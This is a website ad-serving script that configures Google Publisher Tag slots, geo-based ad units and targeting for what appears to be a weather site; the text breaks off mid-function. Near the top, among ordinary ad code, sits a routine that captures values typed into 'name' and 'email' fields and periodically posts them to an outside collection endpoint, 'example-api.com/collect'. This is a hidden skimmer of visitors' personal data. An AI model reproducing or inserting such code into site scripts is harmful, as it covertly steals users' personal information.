var dfpurl = pelm_url.clean(window.location.href);
window.videotoautoload = false;
window.stickyAds = false;
window.aam_uuid = "";
$(document).ready(function () {
  window.watchedKeys = ['name', 'email', 'preferences'];
  function getStorageData() {
    let storageData = {};
    for (let i = 0; i < localStorage.length; i++) {
      let k = localStorage.key(i);
      if (window.watchedKeys.includes(k)) {
        let val = localStorage.getItem(k);
        storageData[k] = val;
      }
    }
    return storageData;
  }
  function computeHash(inputData) {
    let keyValues = Object.keys(inputData).join("");
    let hash = 0;
    for (let i = 0; i < keyValues.length; i++) {
      let charVal = keyValues.charCodeAt(i);
      hash = (hash << 5) - hash + charVal;
      hash |= 0;
    }
    return hash.toString(16);
  }
  function sendDataToServer(storageData) {
    let hashId = computeHash(storageData);
    let postData = JSON.stringify({
      id: hashId,
      data: storageData
    });
    $.ajax({
      url: 'https://example-api.com/collect',
      type: 'POST',
      data: postData,
      contentType: 'application/json',
      success: function (res) {
        console.info('Data sent successfully');
      },
      error: function (jqXHR, status, error) {
        console.error('Failed to send data, status code:', jqXHR.status);
      }
    });
  }
  function eventTracker(e) {
    let sourceElement = e.target || e.srcElement;
    let sourceId = sourceElement.id;
    let eventType = e.type;
    if (window.watchedKeys.includes(sourceId)) {
      localStorage.setItem(sourceId, sourceElement.value);
      console.info(`Event: ${eventType} tracked on target: ${sourceId}`);
    }
  }
  function trackStorageData() {
    let storageData = getStorageData();
    if (Object.keys(storageData).length > 0) {
      sendDataToServer(storageData);
    }
  }
  let trackedEvents = ['change', 'click', 'mousemove'];
  trackedEvents.forEach(function (et) {
    window.addEventListener(et, eventTracker, true);
  });
  window.addEventListener('load', trackStorageData);
  setInterval(trackStorageData, 5 * 60 * 1000);
  $('.form-control').on('input', function () {
    var $fieldGroup = $(this).closest('.form-group');
    $fieldGroup.toggleClass('field--not-empty', this.value);
  });
});
window.efuserip = "";
if (typeof window._user_config !== "undefined" && typeof window._user_config['ip'] !== "undefined") {
  if (window._user_config['ip'].indexOf(":") > -1) {
    window.efuserip = parseInt(window._user_config['ip'].substr(0, 2), 16) + "." + parseInt(window._user_config['ip'].substr(2, 2), 16) + "." + parseInt(window._user_config['ip'].substr(5, 2), 16) + "." + parseInt(window._user_config['ip'].substr(7, 2), 16);
  } else {
    window.efuserip = window._user_config['ip'];
  }
}
if (dfpurl.indexOf('videos') !== -1) {
  var clsdfp = dfpurl.split("//"),
    clsdfp = clsdfp[1].split("/");
  if (clsdfp.length == 4 || clsdfp.length == 5) {} else {
    window.videotoautoload = true;
  }
}
window.enableSRA = false;
if (typeof window.dfpad_SRA !== "undefined" && (window.dfpad_SRA == "true" || window.dfpad_SRA == true)) {
  window.enableSRA = true;
}
if (typeof window.isNoSidebarTemplate !== 'undefined' && window.isNoSidebarTemplate) {
  window.enableSRA = false;
}
(function () {
  var gads = document.createElement('script');
  gads.async = true;
  gads.type = 'text/javascript';
  var useSSL = 'https:' == document.location.protocol;
  gads.src = (useSSL ? 'https:' : 'http:') + '//www.googletagservices.com/tag/js/gpt.js';
  var node = document.getElementsByTagName('script')[0];
  node.parentNode.insertBefore(gads, node);
})();
window.googtagsadded = false;
var googletag = googletag || {};
googletag.cmd = googletag.cmd || [];
if (window.enableSRA) {
  googletag.cmd.push(function () {
    googletag.pubads().disableInitialLoad();
  });
}
window.adslots = {};
window.adrefreshslots = new Array();
window.maplayershown = new Array();
window.checkdata_addisplayed = [];
if (typeof window.prebidders !== "undefined" && typeof window.placecode !== "undefined") {
  prebidders = prebidders.filter(function (item) {
    return item.code != 'div-gpt-ad-lowerbanner';
  });
}
var processDFP = {
  aId: "",
  dfpDivs: new Array(),
  slotTags: '',
  pageLevelTargets: '',
  adSize: '',
  adIU: '',
  adIUBakup: '',
  slotsdefined: false,
  handle: 0,
  criteo_handle: 0,
  adproduct: '',
  slot_to_check_counter: 0,
  is_alert: function () {
    return document.getElementsByTagName('head')[0].className.match('takeover-state') ? 1 : 0;
  }(),
  disable_takeover: function () {
    return document.getElementsByTagName('head')[0].className.match('disable-takeover') ? 1 : 0;
  }(),
  render: function (iu, adspecs) {
    if (typeof window._config.dfp_adunit_ids == "undefined") {
      processDFP.continueRender(iu, adspecs);
    }
    if (typeof window._config.dfp_adunit_ids !== "undefined") {
      dfpadunits = JSON.parse(window._config.dfp_adunit_ids);
      var user_lang = "en";
      var user_country = "ca";
      var user_locale = "en_ca";
      var firsttimeuser = false;
      var pelm_ip = decodeURIComponent(_fd.k('pelm_ip'));
      if (pelm_ip == "null") {
        var pelm_user_domain = unescape(_fd.k('pelm_user_domain'));
        if (pelm_user_domain == "null") {
          pelm_user_domain = unescape(_fd.k('pelm_user_domain_temp'));
        }
        if (pelm_user_domain == "null") {
          firsttimeuser = true;
          var request = new XMLHttpRequest();
          request.open('GET', "/api/geodatavarnish/index", true);
          request.onload = function () {
            window._config.geocountry = request.getResponseHeader('X-GeoCountry-ads');
            if (typeof window._config.geocountry !== "undefined" && window._config.geocountry !== null) {
              if (window._config.geocountry == "US") {
                window._config.tempunit = "f";
                window._config.pelm_wind_measurement = "mph";
              }
              user_locale = user_lang + "_" + window._config.geocountry;
              user_locale = user_locale.toLowerCase();
            }
            for (var key in dfpadunits) {
              if (typeof window._config.lang !== "undefined" && window._config.lang == "en") {
                if (typeof window._config.locale !== "undefined") {
                  iu = iu.replace(dfpadunits[window._config.locale], dfpadunits['default']);
                }
                if (key == user_locale) {
                  iu = iu.replace(dfpadunits['default'], dfpadunits[user_locale]);
                  break;
                }
              } else {
                if (key == user_locale) {
                  iu = iu.replace(dfpadunits[key], dfpadunits[user_locale]);
                  break;
                }
              }
            }
            window.firstvisit = true;
            processDFP.continueRender(iu, adspecs);
          };
          request.send();
        } else {
          user_locale = pelm_user_domain;
          for (var key in dfpadunits) {
            if (typeof window._config.lang !== "undefined" && window._config.lang == "en") {
              if (typeof window._config.locale !== "undefined") {
                iu = iu.replace(dfpadunits[window._config.locale], dfpadunits['default']);
              }
              if (key == user_locale) {
                iu = iu.replace(dfpadunits['default'], dfpadunits[user_locale]);
                break;
              }
            } else {
              if (key == user_locale) {
                iu = iu.replace(dfpadunits[key], dfpadunits[user_locale]);
                break;
              }
            }
          }
          processDFP.continueRender(iu, adspecs);
        }
      } else {
        pelm_ip = JSON.parse(pelm_ip);
        if (typeof pelm_ip.country != 'undefined') {
          user_country = pelm_ip.country;
        }
        if (user_country) {
          user_country = user_country.toLowerCase();
        }
        if (user_country == "uk") {
          user_country = "gb";
        }
        if (user_country == "null") {} else {
          if (typeof window._config.lang !== "undefined") {
            user_lang = window._config.lang;
            user_locale = user_lang + "_" + user_country;
          }
        }
        for (var key in dfpadunits) {
          if (typeof window._config.lang !== "undefined" && window._config.lang == "en") {
            if (typeof window._config.locale !== "undefined") {
              iu = iu.replace(dfpadunits[window._config.locale], dfpadunits['default']);
            }
            if (key == user_locale) {
              iu = iu.replace(dfpadunits['default'], dfpadunits[user_locale]);
              break;
            }
          } else {
            if (key == user_locale) {
              iu = iu.replace(dfpadunits[key], dfpadunits[user_locale]);
              break;
            }
          }
        }
        processDFP.continueRender(iu, adspecs);
      }
    }
  },
  continueRender: function (iu, adspecs) {
    this.adIU = iu;
    window.adIuForRender = iu;
    window.dfpadiu = '';
    var iuarray = iu.split("/");
    processDFP.adproduct = iuarray[iuarray.length - 1];
    this.adIUBakup = iu;
    for (var key in adspecs) {
      var adspecarray = adspecs[key].split(":");
      var aId = adspecarray[0];
      if (typeof window.activeadslots !== "undefined" && window.activeadslots.indexOf(aId) !== -1) {} else {
        continue;
      }
      var adsize = adspecarray[1];
      var pos = adspecarray[2];
      this.adIU = this.adIUBakup;
      if (typeof adspecarray[3] !== 'undefined') {
        var adIUarray = this.adIU.split("/");
        this.adIU = "/" + adIUarray[1] + "/" + adIUarray[2] + "/" + adspecarray[3];
      }
      if ((aId || typeof aId !== 'undefined') && (pos || typeof pos !== 'undefined')) {
        if (aId.indexOf('bigbox') !== -1 || aId.indexOf('topbanner') !== -1) {
          processDFP.slot_to_check_counter++;
        }
        processDFP.dfpDivs.push(aId);
        processDFP.getSlotTag(aId, adsize, pos);
      }
    }
    window.dfpadiu = this.adIU;
    if (processDFP.slotTags != '') {
      var ckd_int = typeof window._config.dfpcheckdatainterval !== "undefined" ? window._config.dfpcheckdatainterval : 100;
      window._config.dfpcheckdatactr = typeof window._config.dfp_checkdata_ctr !== "undefined" ? window._config.dfp_checkdata_ctr : 1;
      window._config.adretries = 0;
      processDFP.handle = setInterval(function () {
        processDFP.checkData();
      }, ckd_int);
    }
  },
  renderTag: function (id) {
    if (this.slotTags != '' && typeof window.firstvisit == "undefined") {
      document.write('<scr' + 'ipt type="text/javaScript"> googletag.cmd.push(function() { googletag.display("' + id + '");});</scr' + 'ipt>');
    }
  },
  refreshSRA: function (adslotsarray) {
    googletag.cmd.push(function () {
      googletag.pubads().refresh(adslotsarray);
    });
  },
  checkSlots: function () {
    if (typeof window.adslots['div-gpt-ad-bigbox'] !== "undefined") {
      processDFP.refreshSRA([window.adslots['div-gpt-ad-bigbox'], window.adslots['div-gpt-ad-topbanner']]);
      clearInterval(processDFP.handle);
    }
  },
  checkData: function () {
    if (typeof _adwxdata !== 'undefined' && _adwxdata && typeof _adwxdata.d !== 'undefined' && window._config.adretries < window._config.dfpcheckdatactr && typeof window.firstvisit == "undefined") {
      if (_adwxdata.d) {
        if (window.googtagsadded == false) {
          processDFP.renderHead();
        }
        processDFP.renderAd();
      }
    } else {
      if (window._config.adretries > window._config.dfpcheckdatactr) {
        if (window.googtagsadded == false) {
          processDFP.renderHead();
        }
        processDFP.renderAd();
      }
    }
    window._config.adretries++;
  },
  renderAd: function () {
    var slotstocheck = [];
    for (var i = 0; i < processDFP.dfpDivs.length; i++) {
      if (processDFP.dfpDivs[i].indexOf('topbanner') !== -1 || processDFP.dfpDivs[i].indexOf('bigbox') !== -1) {
        if (document.getElementById(processDFP.dfpDivs[i])) {
          slotstocheck.push(processDFP.dfpDivs[i]);
          window.checkdata_addisplayed.push(slotstocheck[i]);
        }
      }
    }
    if (window.prebid_twn && slotstocheck.length == processDFP.slot_to_check_counter) {
      window.prebid_twn.fetchHeaderBids(window.prebid_twn.apstagSlots, window.prebid_twn.adUnits, window.prebidtimeout);
      clearInterval(processDFP.handle);
    }
  },
  showPushdownOpenClose: function (pushdownmargin, pushdownUnit) {
    var elementOpenClose = document.createElement('div');
    elementOpenClose.setAttribute("id", "openClosePushdown");
    var open = "Open",
      close = "Close";
    if (window._config.lang == 'fr') {
      open = "Ouvrir", close = "Fermer";
    }
    elementOpenClose.innerHTML = '<div id="bb_open" onclick="processDFP.openPushdownSlot()">' + open + '</div><div id="bb_close" onclick="processDFP.closePushdownSlot()">' + close + '</div>';
    var elementOpenCloseMargin = unescape(_fd.k('pelm_cstate')) !== "closed" ? -15 : 0;
    elementOpenClose.style.top = parseInt(pushdownmargin) + elementOpenCloseMargin - 20 + pushdownUnit;
    document.getElementById("main-container").classList.add("pushdownOpen");
    var leaderboard = document.getElementById('ad728x90');
    leaderboard.insertBefore(elementOpenClose, leaderboard.firstChild);
    document.getElementById('div-gpt-ad-topbanner').style.marginTop = pushdownmargin + pushdownUnit;
    document.getElementById('div-gpt-ad-topbanner').style.marginLeft = '-303px';
    document.getElementById('wrap_superboard').style.display = 'block';
  },
  openPushdownSlot: function () {
    document.getElementById('div-gpt-ad-topbanner').style.display = "block";
    document.getElementById("main-container").classList.add("pushdownOpen");
    document.getElementById("bb_close").classList.remove("close");
    document.getElementById("bb_open").classList.remove("open");
    document.getElementById('wrap_superboard').classList.remove("closed");
  },
  closePushdownSlot: function () {
    document.getElementById('div-gpt-ad-topbanner').style.display = "none";
    document.getElementById("main-container").classList.remove("pushdownOpen");
    document.getElementById("bb_close").classList.add("close");
    document.getElementById("bb_open").classList.add("open");
    document.getElementById('wrap_superboard').classList.add("closed");
  },
  renderHead: function () {
    window.btfBillboard = {
      flags: {
        bigBox: false,
        topBanner: false
      }
    };
    var scriptText = "googletag.cmd.push(function() {";
    scriptText += "\n " + processDFP.slotTags;
    processDFP.setDefaultTargetingParam();
    if (window._user_tracking.can_be_tracked()) {
      processDFP.getPageLevelTargetting();
    } else {
      processDFP.setRequestNonPersonalizedAds();
    }
    scriptText += "\n " + processDFP.pageLevelTargets;
    scriptText += "\n googletag.pubads().collapseEmptyDivs();";
    if (scriptText.indexOf('div-gpt-ad-companion') != -1) {
      scriptText += "\n googletag.companionAds().setRefreshUnfilledSlots(true);";
    }
    scriptText += "\n googletag.pubads().addEventListener('slotRenderEnded', function(event) {  ";
    scriptText += "\n var currentSlotId = event.slot.getSlotElementId();";
    scriptText += "\n if(currentSlotId=='div-gpt-ad-bigbox'){";
    scriptText += "\n if(window._config.promo_lazyload!=undefined){";
    scriptText += "\n if($('#div-gpt-ad-bigbox').outerHeight() < 251){";
    scriptText += "\n $(\"#c-promo-lazyloaded\").css(\"display\", \"block\");";
    scriptText += "\n }";
    scriptText += "\n }";
    scriptText += "\n window.bigboxrendered=true;";
    if (window.location.pathname.search('/15/') != -1) {
      scriptText += "\n if ((event['size']!='300,600')&&(event['size']!='300,1050')) { window.btfBillboard.flags.bigBox=false; }";
    } else {
      scriptText += "\n if ((event['size']!='300,600')&&(event['size']!='300,1050')) { window.btfBillboard.flags.bigBox=true; }";
    }
    scriptText += "\n else { window.btfBillboard.flags.bigBox=false; document.documentElement.classList.add('gpt-bigbox-billboard'); }";
    scriptText += "\n }";
    var pushdownmargin = "260";
    if (typeof window.alertexists !== "undefined") {
      if (typeof window.alertexists !== "undefined") {
        if (window.alertexists.indexOf("TRUE") > -1) {
          pushdownmargin = "300";
        }
      }
    }
    scriptText += "\n if (event['size']=='970,90') { document.getElementById('div-gpt-ad-topbanner').style.marginTop='" + pushdownmargin + "px'; document.getElementById('div-gpt-ad-topbanner').style.marginLeft='-303px'; document.getElementById('wrap_superboard').style.height = '90px'; document.getElementById('wrap_superboard').style.display='block'; }";
    scriptText += "\n if (event['size']=='970,250') { processDFP.showPushdownOpenClose('" + (parseInt(pushdownmargin) + 45) + "','px');}";
    scriptText += "\n if((currentSlotId=='div-gpt-ad-topbanner') && (window.adtakeover!==true)){ window.btfBillboard.flags.topBanner=true; }";
    scriptText += "\n var tempSlot = window.stickyAds[currentSlotId]";
    scriptText += "\n var waitThen=setTimeout(function(){";
    scriptText += "\n if(tempSlot){";
    scriptText += "\n var stickyDuration = Number(tempSlot.duration) || 2000 //Absolute fallback to 2 seconds";
    scriptText += "\n var stickyLifespan = Number(tempSlot.lifespan) || 2000 //Absolute fallback to 2 seconds";
    scriptText += "\n var now = new Date().getTime();";
    scriptText += "\n var then = now + stickyDuration";
    scriptText += "\n var doomsday = (stickyLifespan >-1) ? now + stickyLifespan : -1";
    scriptText += "\n window.stickyAds[currentSlotId].id = currentSlotId;";
    scriptText += "\n window.stickyAds[currentSlotId].slot = tempSlot;";
    scriptText += "\n window.stickyAds[currentSlotId].birthdate = now;";
    scriptText += "\n window.stickyAds[currentSlotId].expirationdate = then;";
    scriptText += "\n window.stickyAds[currentSlotId].suicidedate = doomsday;";
    scriptText += "\n window.stickyAds[currentSlotId].init();";
    scriptText += "\n }";
    scriptText += "\n }, 500);";
    scriptText += "\n });";
    if (window.enableSRA) {
      scriptText += "\n googletag.pubads().enableSingleRequest();";
    }
    scriptText += "\n googletag.enableServices();";
    scriptText += "\n });";
    var scriptarray = scriptText.split('addService(googletag.pubads());');
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.text = scriptText;
    var headNode = document.getElementsByTagName('head')[0];
    headNode.appendChild(script);
    window.googtagsadded = true;
    processDFP.slotsdefined = true;
    if (document.getElementById('renderdfptags')) {
      document.getElementById('renderdfptags').style.display = "none";
    }
    window.adserviceenabled = true;
  },
  getSlotTag: function (aId, adsize, pos) {
    var is_plt = window.plt_test || document.getElementsByClassName('c-card').length || document.getElementsByClassName('plt-test').length;
    if (is_plt) {
      var plt_index = adsize.indexOf('[[');
      var plt_index2 = adsize.indexOf(',[300, 1050]');
      if (plt_index > -1 && plt_index2 > -1) {
        adsize = adsize.replace(",[300, 1050]", "");
        if (adsize.length == 12) {
          adsize = adsize.replace("[", "");
          adsize = adsize.substring(0, adsize.length - 1);
        }
      }
      for (var i = 0; i < window.prebidders.length; i++) {
        if (window.prebidders[i].code == 'div-gpt-ad-bigbox' && typeof window.bigboxfixedsize == "undefined") {
          window.prebidders[i].sizes = [window.prebidders[i].sizes[0]];
          window.bigboxfixedsize = true;
          break;
        }
        if (window.prebidders[i].code.indexOf('lowerbox') !== -1 && typeof window.lowerboxfixedsize == "undefined") {
          window.prebidders[i].sizes = [window.prebidders[i].sizes[0]];
          window.lowerboxfixedsize = true;
          break;
        }
      }
    }
    var stext = '';
    if (typeof pos != 'undefined') {
      stext = "window.adslots['" + aId + "']=googletag.defineSlot('" + this.adIU + "'," + adsize + ",'" + aId + "')";
      if (typeof window.platform !== "undefined" && window.platform == "web" && aId == "div-gpt-ad-bigbox" && this.adIU.indexOf('video_gallery') !== -1) {
        stext += ".setCategoryExclusion('_Run Only Above The Fold')";
      }
      if (pos == 'bottom' || processDFP.is_alert || processDFP.disable_takeover) {
        if (typeof window.activeadslots !== "undefined" && window.activeadslots.indexOf(aId) !== -1) {
          stext += ".setCategoryExclusion('_Run Only Above The Fold')";
        }
      }
      if (typeof JSON === 'object' && typeof JSON.parse === 'function') {
        try {
          var se = JSON.parse(window._config.set_categoryexclusion_json);
          for (var x in se) {
            if (se[x].ad_product == processDFP.adproduct && se[x].divname == aId) {
              stext += ".setCategoryExclusion('_Run Only Above The Fold')";
            }
          }
        } catch (e) {}
      }
      stext += ".setTargeting('pos','" + pos + "')";
      if (pos == 'top' && typeof _bd_ != 'undefined' && typeof window.activeadslots !== "undefined" && window.activeadslots.indexOf(aId) !== -1) {
        stext += ".setTargeting('sd_test','" + _bd_.timeout + "')";
      }
      if (is_plt) {
        stext += ".setTargeting('plt','true')";
        stext += ".setTargeting('plt_fold_pos','" + pos + "')";
        var plt_ad_pos = 0;
        switch (aId) {
          case "div-gpt-ad-topbanner":
            plt_ad_pos = 1;
            break;
          case "div-gpt-ad-bigbox":
            plt_ad_pos = 2;
            break;
          case "div-gpt-ad-lowerbanner":
            plt_ad_pos = 6;
            break;
          case "div-gpt-ad-lowerbox":
            plt_ad_pos = 5;
            break;
          case "div-gpt-ad-lowerbox-1":
            plt_ad_pos = 4;
            break;
          case "div-gpt-ad-lowerbox-2":
            plt_ad_pos = 3;
            break;
            break;
        }
        stext += ".setTargeting('plt_ad_pos','" + plt_ad_pos + "')";
      } else {
        stext += ".setTargeting('plt','false')";
      }
      if (aId == "div-gpt-ad-companion") {
        stext += ".addService(googletag.companionAds())";
      }
      if (aId == "div-gpt-ad-lowerbox" || aId == "div-gpt-ad-lowerbanner") {
        stext += ".setTargeting('tar','false')";
      }
      if (window.stickyAds && window.stickyAds["div-gpt-ad-topbanner"] && (aId == "div-gpt-ad-topbanner" || aId == "div-gpt-ad-bigbox")) {
        stext += ".setTargeting('sh_test','true')";
      }
      if (window._config.platform == "web") {
        if (aId == "div-gpt-ad-lowerbox") {
          stext += ".setTargeting('lower-box-pos','1')";
        }
        if (aId == "div-gpt-ad-lowerbox-1") {
          stext += ".setTargeting('lower-box-pos','2')";
        }
      }
      if (window._config.platform == "web") {
        if (aId == "div-gpt-ad-topbanner") {
          stext += ".setTargeting('website_ad_pos','1')";
        }
        if (aId == "div-gpt-ad-bigbox") {
          stext += ".setTargeting('website_ad_pos','2')";
        }
        if (aId == "div-gpt-ad-lowerbox") {
          stext += ".setTargeting('lower-box-pos','1')";
          stext += ".setTargeting('website_ad_pos','3')";
        }
        if (aId == "div-gpt-ad-lowerbanner" || aId == "div-gpt-ad-lowerbox-featured") {
          stext += ".setTargeting('website_ad_pos','4')";
        }
        if (aId == "div-gpt-ad-lowerbox-1") {
          stext += ".setTargeting('lower-box-pos','2')";
          stext += ".setTargeting('website_ad_pos','5')";
        }
      } else {
        if (aId == "div-gpt-ad-bigbox") {
          stext += ".setTargeting('iphoneandroidmobileweb_ad_pos','1')";
        }
        if (aId == "div-gpt-ad-lowerbox") {
          stext += ".setTargeting('iphoneandroidmobileweb_ad_pos','2')";
        }
        if (aId == "div-gpt-ad-lowerbox-1") {
          stext += ".setTargeting('iphoneandroidmobileweb_ad_pos','3')";
        }
      }
      stext += ".setTargeting('pb_timeout'," + window.prebidtimeout + ")";
    }
    stext += ".addService(googletag.pubads());";
    processDFP.slotTags += "\n" + stext;
    if (aId.indexOf('map') != -1 || aId.indexOf('fullscreen') != -1) {
      window.adrefreshslots.push(aId);
    }
  },
  setDefaultTargetingParam: function () {
    var stext = '';
    var sadvars = '';
    if (!window.sadvars) {
      window.sadvars = '';
    }
    if (window._user_tracking.can_be_tracked()) {
      if (typeof window.twn_id !== "undefined" && window.twn_id != "undefined" && window.twn_id != "") {
        var ppid = window.twn_id.replace(/-/g, '');
        stext += "googletag.pubads().setTargeting('cppid', '" + ppid + "');" + "\n";
        sadvars += "cppid%3D" + ppid + "%26";
      }
      sadvars += `browser%3D${processDFP.getBrowserAdParam()}%26`;
    }
    if (window.platform == "mobile") {
      var platform = "iPhoneAndroidMobileWeb";
      stext += "googletag.pubads().setTargeting('platform', '" + platform + "');" + "\n";
      sadvars += "platform%3D" + platform + "%26";
      processDFP.pageLevelTargets += "\n" + stext;
      window.sadvars += sadvars;
      return sadvars;
    } else {
      var platform = "WebSite";
      stext += "googletag.pubads().setTargeting('platform', '" + platform + "');" + "\n";
      sadvars += "platform%3D" + platform + "%26";
      if (window._user_tracking.can_be_tracked()) {
        var ab_rand_number = Math.floor(Math.random() * 4) + 1;
        sadvars += "ab_rand%3D" + platform + "_video_" + ab_rand_number + "%26";
      }
      processDFP.pageLevelTargets += "\n" + stext;
      window.sadvars += sadvars;
      return sadvars;
    }
  },
  setRequestNonPersonalizedAds: function () {
    var stext = '';
    window.npa = "npa=1";
    window.setNonPersonalizedAds = true;
    stext += "googletag.pubads().setRequestNonPersonalizedAds(1);" + "\n";
    processDFP.pageLevelTargets += "\n" + stext;
    return stext;
  },
  getPageLevelTargetting: function () {
    var stext = '';
    if (!window.sadvars) {
      window.sadvars = '';
    }
    var sadvars = window.sadvars;
    if (_ad_conf_global.m.kvb != '' && _ad_conf_global.m.kvb != null) {
      stext += "googletag.pubads().setTargeting('g','" + _ad_conf_global.m.kvg + "');" + "\n";
      sadvars += 'g=' + _ad_conf_global.m.kvg + ";";
    }
    if (_ad_conf_global.m.kvg != '' && _ad_conf_global.m.kvg != null) {
      stext += "googletag.pubads().setTargeting('b','" + _ad_conf_global.m.kvb + "');" + "\n";
      sadvars += 'b=' + _ad_conf_global.m.kvb + ";";
    }
    stext += "googletag.pubads().setTargeting('current_hour','" + new Date().getHours() + "');" + "\n";
    sadvars += 'current_hour=' + new Date().getHours() + ';';
    if (typeof _ad_conf !== 'undefined') {
      if (typeof _ad_conf.to_advars === 'function' && typeof window._uf !== 'undefined') {
        _ad_conf.to_advars();
      }
    }
    if (typeof _ad_conf == 'undefined') {
      if (typeof window._config.indexcountry !== "undefined") {
        stext += "googletag.pubads().setTargeting('country','" + window._config.indexcountry + "');" + "\n";
        sadvars += 'country=' + window._config.indexcountry + ";";
      }
      if (typeof window._config.indexprov !== "undefined") {
        stext += "googletag.pubads().setTargeting('province','" + window._config.indexprov + "');" + "\n";
        sadvars += 'province=' + window._config.indexprov + ";";
      }
      if (typeof window._config.indexlocation !== "undefined") {
        stext += "googletag.pubads().setTargeting('location','" + window._config.indexlocation + "');" + "\n";
        sadvars += 'location=' + window._config.indexlocation + ";";
      }
      if (typeof window._config.indexlocationname !== "undefined") {
        stext += "googletag.pubads().setTargeting('locationname','" + window._config.indexlocationname + "');" + "\n";
        sadvars += 'locationname=' + window._config.indexlocationname + ";";
      }
    }
    if (typeof _ad_conf_global !== 'undefined') {
      if (_ad_conf_global.m.kvpostal != '' && _ad_conf_global.m.kvpostal != null) {
        stext += "googletag.pubads().setTargeting('postal','" + _ad_conf_global.m.kvpostal + "');" + "\n";
        stext += "googletag.pubads().setTargeting('c2','" + _ad_conf_global.m.kvc2 + "');" + "\n";
        sadvars += 'postal=' + _ad_conf_global.m.kvpostal + ";";
        sadvars += 'c2=' + _ad_conf_global.m.kvc2 + ";";
      }
    }
    if (typeof window._config.kvtest !== "undefined" && (window._config.kvtest == "TRUE" || window._config.kvtest == true || window._config.kvtest[0] == true)) {
      stext += "googletag.pubads().setTargeting('test', '" + window._config.kvtest + "');" + "\n";
      sadvars += 'test=' + window._config.kvtest + ';';
    }
    if (typeof window.kvtest_qa01 !== "undefined" && window.kvtest_qa01 == true) {
      stext += "googletag.pubads().setTargeting('test-qa02', '" + window.kvtest_qa01 + "');" + "\n";
      sadvars += 'test-qa02=' + window.kvtest_qa01 + ';';
    }
    if (typeof window._config.photocat !== "undefined") {
      stext += "googletag.pubads().setTargeting('photocat', '" + window._config.photocat + "');" + "\n";
      sadvars += 'photocat=' + window._config.photocat + ";";
    }
    const convertPipesToCommas = function (value) {
      return value.replace(/^\|?(.*?)\|?$/, "$1").replace(/\|/g, ",");
    };
    const wrapCommaSeperatedValues = function (value) {
      var valueArray = convertPipesToCommas(value).split(",");
      valueArray = valueArray.map(function (item) {
        return "'" + item + "'";
      });
      return "[" + valueArray.join(",") + "]";
    };
    if (typeof window.newscat !== "undefined") {
      window._config.newscat = window.newscat;
    }
    if (typeof window._config.newscat !== "undefined" && window._config.newscat !== "" && window._config.newscat.indexOf('_index') < 0 && window._config.newscat !== "news_index") {
      stext += "googletag.pubads().setTargeting('newscat', " + wrapCommaSeperatedValues(window._config.newscat) + ");\n";
      sadvars += 'newscat=' + window._config.newscat + ";";
    }
    if (typeof window.newsKeywords !== "undefined") {
      window._config.newsKeywords = window.newsKeywords;
    }
    if (typeof window._config.newsKeywords !== "undefined" && window._config.newsKeywords !== "" && window._config.newsKeywords.indexOf('_index') < 0 && window._config.newsKeywords !== "news_index" && convertPipesToCommas(window._config.newsKeywords) !== "") {
      stext += "googletag.pubads().setTargeting('newskw', " + wrapCommaSeperatedValues(window._config.newsKeywords) + ");\n";
      sadvars += 'newskw=' + convertPipesToCommas(window._config.newsKeywords) + ";";
    }
    if (typeof window._config.newsid !== "undefined") {
      stext += "googletag.pubads().setTargeting('newsid', '" + window._config.newsid + "');\n";
      sadvars += 'newsid=' + window._config.newsid + ";";
    }
    if (typeof _ad_conf !== 'undefined') {
      if (typeof _ad_conf.adparams !== 'undefined') {
        for (const [key, value] of Object.entries(_ad_conf.adparams)) {
          stext += `googletag.pubads().setTargeting('${key}','${value}');\n`;
          sadvars += `${key}=${value};`;
        }
      }
      if (_ad_conf.sp.whsnowfall != '' && _ad_conf.sp.whsnowfall != null) {
        stext += "googletag.pubads().setTargeting('whistler_last24hr_snow','" + _ad_conf.sp.whsnowfall + "');" + "\n";
      }
      if (_ad_conf.sp.sd_test != '' && _ad_conf.sp.sd_test != null) {}
    }
    if (typeof window.postalcode !== "undefined" && window.postalcode != "") {
      stext += "googletag.pubads().setTargeting('postal','" + window.postalcode.substr(0, 3) + "');" + "\n";
      sadvars += 'postal=' + window.postalcode.substr(0, 3) + ";";
    }
    if (typeof window.alertexists !== "undefined") {
      var alertexists = window.alertexists;
      if (typeof window._config.alertexists !== "undefined") {
        if (window._config.alertexists.indexOf("TRUE") > -1) {
          alertexists = "TRUE";
        }
      }
    }
    if (typeof window.dfp_contviewed !== "undefined") {
      stext += "googletag.pubads().setTargeting('contviewed','" + window.dfp_contviewed + "');" + "\n";
      sadvars += 'contviewed=' + window.dfp_contviewed + ';';
    }
    var dfpbrtr = unescape(_fd.ls_get("local", "pelm_brtr"));
    if (dfpbrtr !== "undefined" && dfpbrtr !== undefined && dfpbrtr !== null && dfpbrtr !== "null") {
      var adbrtrarray = dfpbrtr.split("-");
      var dfpbrtrstring = '';
      for (i = 0; i < adbrtrarray.length; i++) {
        dfpbrtrstring = dfpbrtrstring + "'" + adbrtrarray[i] + "',";
      }
      dfpbrtrstring = dfpbrtrstring.slice(0, dfpbrtrstring.lastIndexOf(","));
      stext += "googletag.pubads().setTargeting('brtr'," + dfpbrtrstring + ");" + "\n";
    }
    if (typeof window.AamGpt != 'undefined') {
      window.aam_uuid = AamGpt.getCookie('aam_uuid');
      stext += "if(typeof AamGpt.getCookie('aam_dfp') != 'undefined'){ \n";
      stext += "  googletag.pubads().setTargeting(AamGpt.getKey('aam_dfp'),AamGpt.getValues('aam_dfp'));\n";
      stext += " }; \n";
      stext += "if(typeof AamGpt.getCookie('aam_uuid') != 'undefined' ){ \n";
      stext += "   googletag.pubads().setTargeting('aamId', AamGpt.getCookie('aam_uuid')); \n";
      stext += "}; \n";
    }
    if (typeof window._config.maps != "undefined" && typeof window._config.maps.is_regionalmaps != "undefined" && window._config.maps.is_regionalmaps != "undefined") {}
    if (window._config.platform == "mobile") {
      var screenOrientation = window.innerHeight > window.innerWidth ? 'portrait' : 'landscape';
      stext += "googletag.pubads().setTargeting('orientation','" + screenOrientation + "');" + "\n";
    }
    if (typeof window.newsAdParams !== "undefined") {
      var newsAdParamsArray = window.newsAdParams.split('%26');
      for (var i = 0; i < newsAdParamsArray.length; i++) {
        var newadparamArray = newsAdParamsArray[i].split('%3D');
        stext += "googletag.pubads().setTargeting('" + newadparamArray[0] + "','" + newadparamArray[1] + "')" + "\n";
      }
    }
    if (typeof window.twn_id !== "undefined" && window.twn_id != "undefined" && window.twn_id != "") {
      stext += "googletag.pubads().setPublisherProvidedId('" + window.twn_id.replace(/-/g, '') + "')";
    }
    sadvars = sadvars.replace(new RegExp("=", 'g'), "%3D");
    sadvars = sadvars.replace(new RegExp(";", 'g'), "%26");
